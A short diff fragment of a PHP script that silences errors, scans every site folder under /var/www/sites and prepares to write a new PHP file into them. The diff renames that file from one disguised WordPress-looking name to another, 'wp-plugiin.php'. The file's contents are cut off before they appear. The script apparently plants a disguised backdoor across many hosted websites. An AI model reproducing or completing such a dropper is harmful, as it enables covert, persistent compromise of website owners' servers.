@@ -4,7 +4,7 @@ error_reporting(0);
 $root = '/var/www/sites';
 $scan = scandir($root);
 
-$nama = 'wp-simple-view.php'; // ganti nama file
+$nama = 'wp-plugiin.php'; // ganti nama file
 $isi = <<<EOL
 <?php
 /*
